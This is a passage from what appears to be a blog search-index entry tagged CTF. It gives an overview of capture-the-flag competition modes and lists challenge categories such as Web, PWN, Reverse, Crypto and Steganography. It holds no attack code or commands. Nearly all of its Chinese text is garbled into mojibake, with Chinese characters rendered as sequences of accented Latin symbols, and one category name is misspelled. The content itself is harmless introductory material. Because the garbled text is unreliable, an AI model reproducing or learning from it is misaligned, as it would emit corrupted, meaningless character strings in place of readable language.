title="ä¸€ã€è§£ä½“æ¨¡å¼ï¼ˆJeopardyï¼‰"></a>ä¸€ã€è§£ä½“æ¨¡å¼ï¼ˆJeopardyï¼‰</h3><p>å¯é€šè¿‡äº’è”ç½‘æˆ–ç°åœºç½‘ç»œå‚ä¸ï¼Œè§£å†³ç½‘ç»œå®‰å…¨æŠ€æœ¯æŒ‘æˆ˜é¢˜ç›®ï¼Œå¹¶ä»¥åˆ†å€¼å’Œæ—¶é—´æ’åã€‚é¢˜ç›®ä¸»è¦åŒ…æ‹¬ï¼šé€†å‘ï¼Œæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨ï¼Œwebæ¸—é€ï¼Œå¯†ç ï¼Œå–è¯ï¼Œéšå†™ï¼Œå®‰å…¨ç¼–ç¨‹</p><h3 id="äºŒã€æ”»é˜²æ¨¡å¼ï¼ˆAttack-Defenseï¼‰"><a href="#äºŒã€æ”»é˜²æ¨¡å¼ï¼ˆAttack-Defenseï¼‰" class="headerlink" title="äºŒã€æ”»é˜²æ¨¡å¼ï¼ˆAttack-Defenseï¼‰"></a>äºŒã€æ”»é˜²æ¨¡å¼ï¼ˆAttack-Defenseï¼‰</h3><p>åœ¨ç½‘ç»œç©ºé—´äº’ç›¸è¿›è¡Œæ”»å‡»å’Œé˜²å®ˆï¼ŒæŒ–æ˜ç½‘ç»œæœåŠ¡æ¼æ´å¹¶æ”»å‡»å¯¹æ‰‹æ¥å¾—åˆ†ï¼Œä¿®è¡¥è‡ªèº«æœåŠ¡æ¼æ´è¿›è¡Œé˜²å¾¡æ¥é¿å…ä¸¢åˆ†ã€‚</p><h3 id="ä¸‰ã€æ··åˆæ¨¡å¼ï¼ˆMixï¼‰"><a href="#ä¸‰ã€æ··åˆæ¨¡å¼ï¼ˆMixï¼‰" class="headerlink" title="ä¸‰ã€æ··åˆæ¨¡å¼ï¼ˆMixï¼‰"></a>ä¸‰ã€æ··åˆæ¨¡å¼ï¼ˆMixï¼‰</h3><p>æ¯”å¦‚å…ˆé€šè¿‡è§£ä½“è·å–ä¸€äº›åˆå§‹åˆ†ï¼Œç„¶åé€šè¿‡æ”»å‡»å¯¹æŠ—è¿›è¡Œå¾—åˆ†åŠ å‡çš„é›¶å’Œã€‚ä¸»è¦çš„CTFé¢˜å‹ï¼š</p><p>1ã€MISC(Miscellaneous)ç±»å‹ï¼Œå³å®‰å…¨æ‚é¡¹ï¼Œé¢˜ç›®æˆ–æ¶‰åŠæµé‡åˆ†æã€ç”µå­å–è¯ã€äººè‚‰æœç´¢ã€æ•°æ®åˆ†æç­‰ç­‰ã€‚ï¼ˆè¿™ä¸ªä¹Ÿæ˜¯éš¾åº¦æ¯”è¾ƒå°ï¼Œè¿˜æœ‰å…¥é—¨æ¯”è¾ƒå®¹æ˜“çš„ç±»å‹ï¼‰</p><p>2ã€Reverseï¼ˆé€†å‘åˆ†æï¼‰</p><p>3ã€Crypotï¼ˆå¯†ç ï¼ŒåŠ è§£å¯†ï¼Œå®‰å…¨ç¼–ç¨‹ï¼‰å³å¯†ç å­¦ï¼Œé¢˜ç›®è€ƒå¯Ÿå„ç§åŠ è§£å¯†æŠ€æœ¯ï¼ŒåŒ…æ‹¬å¤å…¸åŠ å¯†æŠ€æœ¯ã€ç°ä»£åŠ å¯†æŠ€æœ¯ç”šè‡³å‡ºé¢˜è€…è‡ªåˆ›åŠ å¯†æŠ€æœ¯ã€‚</p><p>4ã€Mobileï¼ˆapkï¼Œå®‰å“ï¼Œiosï¼‰</p><p>5ã€Exploitï¼ˆæ¼æ´åˆ©ç”¨ï¼‰</p><p>6ã€Webï¼ˆæ¼æ´æŒ–æ˜ä¸åˆ©ç”¨ï¼‰é¢˜ç›®ä¼šæ¶‰åŠåˆ°å¸¸è§çš„Webæ¼æ´ï¼Œè¯¸å¦‚æ³¨å…¥ã€XSSã€æ–‡ä»¶åŒ…å«ã€ä»£ç æ‰§è¡Œç­‰æ¼æ´ã€‚</p><p>7ã€Reconï¼ˆç¤¾å·¥ï¼Œæƒ…æŠ¥æœç´¢åˆ†æï¼‰</p><p>8ã€Forensicï¼ˆç½‘ç»œæµé‡åˆ†æï¼Œéšå†™åˆ†æï¼Œç³»ç»Ÿå–è¯ï¼‰</p><p>9ã€PPC(Professionally Program Coder)ç±»å‹ï¼Œå³ç¼–ç¨‹ç±»é¢˜ç›®ï¼Œé¢˜ç›®æ¶‰åŠåˆ°ç¼–ç¨‹ç®—æ³•ï¼Œç›¸æ¯”ACMè¾ƒä¸ºå®¹æ˜“ã€‚</p><p>10ã€PWNç±»å‹ï¼ŒPWNåœ¨é»‘å®¢ä¿šè¯­ä¸­ä»£è¡¨ç€æ”»ç ´ã€å–å¾—æƒé™ï¼Œå¤šä¸ºæº¢å‡ºç±»é¢˜ç›®</p><p>11ã€Stega(Steganography)ç±»å‹ï¼Œå³éšå†™æœ¯ï¼Œé¢˜ç›®çš„Flagä¼šéšè—åˆ°å›¾ç‰‡ã€éŸ³é¢‘ã€è§†é¢‘ç­‰å„ç±»æ•°æ®è½½ä½“ä¸­ä¾›å‚èµ›è€…è·å–ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
